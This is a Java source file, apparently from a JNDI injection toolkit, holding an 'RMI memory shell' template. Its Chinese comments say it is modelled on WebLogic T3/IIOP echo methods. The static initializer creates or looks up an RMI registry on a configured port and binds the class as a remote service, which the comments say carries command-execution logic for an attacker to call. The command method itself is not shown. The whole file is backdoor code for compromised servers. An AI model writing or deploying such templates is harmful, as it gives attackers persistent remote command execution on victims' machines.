package com.qi4l.jndi.template.memshell;

import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

/**
 * RMI 内存马（也不算内存马吧，算是一种方式）
 * 参考 weblogic 的 T3/IIOP 回显方式
 * 启动一个 RMI Registry 并 bind 一个具有命令执行逻辑的方法
 * 然后攻击者可以利用此 Registry 调用对应的 service
 * <p>
 * 目前的实现方式存在被反制的风险，慎用哦
 * <p>
 */
public class RMIBindTemplate implements Remote {
    static int port;

    static int bindPort;

    static String serviceName;


    static {
        try {
            Registry registry = null;
            try {
                registry = LocateRegistry.createRegistry(port);
            } catch (Exception ignored) {

            }
            if (registry != null) {
                registry = LocateRegistry.getRegistry("127.0.0.1", port);
            }

            RMIBindTemplate rbt = new RMIBindTemplate();
            UnicastRemoteObject.exportObject(rbt, bindPort);
            registry.rebind(serviceName, rbt);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
